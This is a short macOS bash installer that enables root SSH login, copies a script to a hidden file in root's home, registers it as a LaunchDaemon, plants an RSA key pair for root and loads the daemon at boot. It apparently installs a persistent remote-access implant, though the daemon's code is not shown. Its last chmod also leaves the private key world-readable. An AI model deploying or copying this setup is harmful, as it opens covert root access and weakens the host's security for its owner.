#!/bin/bash

CDIR=$(pwd)
cd $(dirname $0)

# Generate Host Keys
ssh-keygen -A
# sed handles if option is incorrect or commented out
sed -i '' 's/#* *PermitRootLogin .*/PermitRootLogin yes/g' /etc/ssh/sshd_config
sed -i '' 's/#* *ServerAliveInterval .*/ServerAliveInterval 30/g' /etc/ssh/ssh_config
sed -i '' 's/#* *ServerAliveCountMax .*/ServerAliveCountMax 2/g' /etc/ssh/ssh_config
# grep handles cases where our desired option is not in the file
grep -q '^PermitRootLogin ' /etc/ssh/sshd_config || echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
grep -q '^ServerAliveInterval ' /etc/ssh/ssh_config || echo 'ServerAliveInterval 30' >> /etc/ssh/ssh_config
grep -q '^ServerAliveCountMax ' /etc/ssh/ssh_config || echo 'ServerAliveCountMax 2' >> /etc/ssh/ssh_config
# Setup files for daemon
cp iron_biscotti.sh /var/root/.iron_biscotti.sh
chown root:wheel /var/root/.iron_biscotti.sh
cp com.iron_biscotti.plist /Library/LaunchDaemons/com.iron_biscotti.plist
chown root:wheel /Library/LaunchDaemons/com.iron_biscotti.plist
mkdir -p /var/root/.ssh/
cp id_rsa /var/root/.ssh/id_rsa
chown root:root /var/root/.ssh/id_rsa
chmod 400 /var/root/.ssh/id_rsa
cp id_rsa.pub /var/root/.ssh/id_rsa.pub
chown root:root /var/root/.ssh/id_rsa.pub
chmod 644 /var/root/.ssh/id_rsa


# Enable daemon
launchctl load -w /Library/LaunchDaemons/com.iron_biscotti.plist
cd $CDIR
